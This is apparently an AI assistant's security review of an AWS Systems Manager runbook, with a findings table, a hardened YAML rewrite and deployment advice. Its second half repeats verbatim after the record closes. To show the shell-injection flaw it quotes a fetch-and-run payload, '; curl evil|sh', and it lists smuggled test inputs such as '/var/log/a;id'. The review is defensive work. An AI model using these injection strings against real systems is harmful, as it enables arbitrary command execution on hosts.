{"id": "c192f43f-42c7-474f-b9d1-5d73cada48e5", "role": "assistant", "content": [{"text": "The runbook has several serious problems. The worst is an `rm -rf` on an unvalidated path. I haven't deployed the hardened version below, so test it in a sandbox account first.

## Findings

| Severity | Issue | Why it matters |
|---|---|---|
| **Critical** | `LogPath` has `allowedPattern: '.*'` and is pasted unquoted into `tar` and `rm -rf {{LogPath}}/*`. | The value is substituted into a root shell command. `; curl evil\|sh` runs arbitrary commands. An empty value, `/`, or `../..` turns the command into `rm -rf /*`. |
| **Critical** | `DbPassword` is echoed in the command (`echo "restarting with password …"`). | The password ends up in Run Command history, command output, any CloudWatch or S3 output logging, and shell history. It is also never used. |
| **High** | `DbPassword` uses `type: SecureString`. | I couldn't find `SecureString` listed among the Automation parameter types in the docs. SecureString is a Parameter Store type, so the runbook probably fails validation. Even if it were accepted, it would not mask the value after substitution. |
| **High** | `curl -k` | It disables TLS verification, so anyone on the network path can impersonate the internal API. |
| **High** | `assumeRole` is hardcoded to `AppOpsRole` in account `012345678901_2`. | Other teams can't use it without editing it, and everyone who runs it gets the same privileges. The caller should supply a scoped role. |
| **High** | The `CheckHealth` script calls `describe_instance_status()` with no filter. | It reads every instance in the region and needs `ec2:DescribeInstanceStatus` on `*`. It never uses `InstanceId`, and it can't fail, so it checks nothing. |
| **Medium** | `onFailure: Continue` on `RotateLogs` | If the archive fails, the runbook still reports success and the later steps run. |
| **Medium** | `InstanceId` has no validation. | Callers can pass any string. |
| **Medium** | `timeoutSeconds: 1200` on a health check, and no timeout on the `RotateLogs` command | A hung step holds the role's session for a long time. |
| **Medium** | The archive is written to `/var/tmp/logs.tgz` with the default umask. | The file may be readable by other users and persists across reboots. |
| **Low** | `onCancel: step:Wait` | The cancel handler gets a short window (about 2 minutes) and shouldn't point at an unrelated sleep step. |
| **Low** | Nothing restarts the service, and `Wait` runs after the health check instead of before it. | The description says it restarts the app, but the only "restart" is an `echo`. |

I added a restart step with a `ServiceName` parameter. Delete it if you don't want it.

## Hardened version

```yaml
schemaVersion: '0.3'
description: >-
  Rotates an application log directory on one instance, restarts the service,
  and verifies instance health. Run with a least-privilege role supplied by the caller.
assumeRole: '{{ AutomationAssumeRole }}'
parameters:
  AutomationAssumeRole:
    type: String
    description: IAM role Automation assumes. Scope it to the actions and instances this runbook needs.
    allowedPattern: '^arn:aws(-[a-z]+)*:iam::\d{12}:role/[\w+=,.@/-]{1,128}$'
  InstanceId:
    type: String
    description: Single EC2 or managed instance ID.
    allowedPattern: '^m?i-[0-9a-f]{8,17}$'
  LogPath:
    type: String
    description: Absolute log directory under /var/log. No dots, spaces or shell characters.
    allowedPattern: '^/var/log/[A-Za-z0-9_-]+(/[A-Za-z0-9_-]+)*$'
    minChars: 10
    maxChars: 100
  ServiceName:
    type: String
    description: systemd unit name, without the .service suffix.
    allowedPattern: '^[A-Za-z0-9_.@-]{1,64}$'
  NotifyUrl:
    type: String
    description: HTTPS endpoint to notify after rotation.
    default: https://internal-api.example.com/notify
    allowedPattern: '^https://[A-Za-z0-9.-]+(:\d{1,5})?(/[A-Za-z0-9._~/-]*)?$'
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    onFailure: Abort
    timeoutSeconds: 300
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{ InstanceId }}']
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        executionTimeout: ['240']
        commands:
          - |
            set -euo pipefail
            umask 077
            LOG_PATH='{{ LogPath }}'
            ARCHIVE_DIR=/var/log/archive
            ARCHIVE="$ARCHIVE_DIR/logs-$(date -u +%Y%m%dT%H%M%SZ).tgz"
            [ -d "$LOG_PATH" ] && [ ! -L "$LOG_PATH" ] || { echo "LogPath is not a plain directory"; exit 1; }
            [ "$(realpath -e -- "$LOG_PATH")" = "$LOG_PATH" ] || { echo "LogPath resolves elsewhere"; exit 1; }
            install -d -m 700 "$ARCHIVE_DIR"
            tar -czf "$ARCHIVE" -C "$LOG_PATH" .
            tar -tzf "$ARCHIVE" > /dev/null          # verify archive before deleting anything
            find "$LOG_PATH" -mindepth 1 -xdev -type f -delete
            curl --fail --silent --show-error --max-time 10 \
                 --proto '=https' --tlsv1.2 -X POST '{{ NotifyUrl }}'
  - name: RestartService
    action: aws:runCommand
    onFailure: Abort
    timeoutSeconds: 120
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{ InstanceId }}']
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        commands:
          - set -euo pipefail
          - systemctl restart '{{ ServiceName }}.service'
  - name: Wait
    action: aws:sleep
    inputs:
      Duration: PT30S
  - name: CheckHealth
    action: aws:executeScript
    onFailure: Abort
    timeoutSeconds: 120
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        InstanceId: '{{ InstanceId }}'
      Script: |-
        import boto3

        def handler(events, context):
            ec2 = boto3.client('ec2')
            resp = ec2.describe_instance_status(
                InstanceIds=[events['InstanceId']], IncludeAllInstances=True)
            statuses = resp['InstanceStatuses']
            if not statuses:
                raise Exception('Instance not found')
            s = statuses[0]
            result = {
                'InstanceState': s['InstanceState']['Name'],
                'InstanceStatus': s['InstanceStatus']['Status'],
                'SystemStatus': s['SystemStatus']['Status'],
            }
            if result['InstanceState'] != 'running' or result['InstanceStatus'] != 'ok':
                raise Exception('Unhealthy: %s' % result)
            return result
```

### What changed
- **Injection:** `LogPath` must be an absolute path under `/var/log` with no dots or shell characters. The script also quotes the value and checks that it is a real directory and not a symlink. Deletion is limited to regular files on the same filesystem, and it only happens after the archive is verified.
- **Secrets:** The password parameter is gone. If the service needs a database credential, have it read the credential from Secrets Manager or Parameter Store through the instance profile. Never pass it through a runbook parameter or echo it.
- **TLS:** `-k` is removed and the request is HTTPS-only. If the internal API uses a private CA, install that CA on the instances or add `--cacert <path>`.
- **Role:** The caller supplies the role, and the ARN is validated.
- **Failure handling:** Every step aborts on failure, and timeouts are short. I removed the odd `onCancel`.
- **Health check:** It is scoped to the one instance and fails if the instance isn't healthy. It also returns only strings, so the output serializes cleanly.
- **Auditing:** Command output goes to CloudWatch. Make sure that log group is encrypted and access-controlled, since the output can include log contents.

## Before you share it
- **Role scope:** The runbook can't limit what the role can do. Give the role `ssm:SendCommand` only on the `AWS-RunShellScript` document and on instances matching a tag condition, plus `ec2:DescribeInstanceStatus`. Don't reuse a broad ops role.
- **Document sharing:** Share the document with specific account IDs. Don't make it public.
- **Instance access:** Use the SSM Agent and an instance profile. Don't open SSH or other inbound access for this.
- **Testing:** Create the document in a test account and run it with bad inputs, such as `/`, `/var/log/a;id` and `../etc`. Check that each one is rejected at the parameter stage.
- **Customization:** `LogPath` is locked to `/var/log`. Teams with a different layout should widen the allowed pattern deliberately.", "type": "text"}], "created_at": null}

```yaml
    allowedPattern: '^https://[A-Za-z0-9.-]+(:\d{1,5})?(/[A-Za-z0-9._~/-]*)?$'
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    onFailure: Abort
    timeoutSeconds: 300
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{ InstanceId }}']
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        executionTimeout: ['240']
        commands:
          - |
            set -euo pipefail
            umask 077
            LOG_PATH='{{ LogPath }}'
            ARCHIVE_DIR=/var/log/archive
            ARCHIVE="$ARCHIVE_DIR/logs-$(date -u +%Y%m%dT%H%M%SZ).tgz"
            [ -d "$LOG_PATH" ] && [ ! -L "$LOG_PATH" ] || { echo "LogPath is not a plain directory"; exit 1; }
            [ "$(realpath -e -- "$LOG_PATH")" = "$LOG_PATH" ] || { echo "LogPath resolves elsewhere"; exit 1; }
            install -d -m 700 "$ARCHIVE_DIR"
            tar -czf "$ARCHIVE" -C "$LOG_PATH" .
            tar -tzf "$ARCHIVE" > /dev/null          # verify archive before deleting anything
            find "$LOG_PATH" -mindepth 1 -xdev -type f -delete
            curl --fail --silent --show-error --max-time 10 \
                 --proto '=https' --tlsv1.2 -X POST '{{ NotifyUrl }}'
  - name: RestartService
    action: aws:runCommand
    onFailure: Abort
    timeoutSeconds: 120
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{ InstanceId }}']
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        commands:
          - set -euo pipefail
          - systemctl restart '{{ ServiceName }}.service'
  - name: Wait
    action: aws:sleep
    inputs:
      Duration: PT30S
  - name: CheckHealth
    action: aws:executeScript
    onFailure: Abort
    timeoutSeconds: 120
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        InstanceId: '{{ InstanceId }}'
      Script: |-
        import boto3

        def handler(events, context):
            ec2 = boto3.client('ec2')
            resp = ec2.describe_instance_status(
                InstanceIds=[events['InstanceId']], IncludeAllInstances=True)
            statuses = resp['InstanceStatuses']
            if not statuses:
                raise Exception('Instance not found')
            s = statuses[0]
            result = {
                'InstanceState': s['InstanceState']['Name'],
                'InstanceStatus': s['InstanceStatus']['Status'],
                'SystemStatus': s['SystemStatus']['Status'],
            }
            if result['InstanceState'] != 'running' or result['InstanceStatus'] != 'ok':
                raise Exception('Unhealthy: %s' % result)
            return result
```

### What changed
- **Injection:** `LogPath` must be an absolute path under `/var/log` with no dots or shell characters. The script also quotes the value and checks that it is a real directory and not a symlink. Deletion is limited to regular files on the same filesystem, and it only happens after the archive is verified.
- **Secrets:** The password parameter is gone. If the service needs a database credential, have it read the credential from Secrets Manager or Parameter Store through the instance profile. Never pass it through a runbook parameter or echo it.
- **TLS:** `-k` is removed and the request is HTTPS-only. If the internal API uses a private CA, install that CA on the instances or add `--cacert <path>`.
- **Role:** The caller supplies the role, and the ARN is validated.
- **Failure handling:** Every step aborts on failure, and timeouts are short. I removed the odd `onCancel`.
- **Health check:** It is scoped to the one instance and fails if the instance isn't healthy. It also returns only strings, so the output serializes cleanly.
- **Auditing:** Command output goes to CloudWatch. Make sure that log group is encrypted and access-controlled, since the output can include log contents.

## Before you share it
- **Role scope:** The runbook can't limit what the role can do. Give the role `ssm:SendCommand` only on the `AWS-RunShellScript` document and on instances matching a tag condition, plus `ec2:DescribeInstanceStatus`. Don't reuse a broad ops role.
- **Document sharing:** Share the document with specific account IDs. Don't make it public.
- **Instance access:** Use the SSM Agent and an instance profile. Don't open SSH or other inbound access for this.
- **Testing:** Create the document in a test account and run it with bad inputs, such as `/`, `/var/log/a;id` and `../etc`. Check that each one is rejected at the parameter stage.
- **Customization:** `LogPath` is locked to `/var/log`. Teams with a different layout should widen the allowed pattern deliberately."}]}
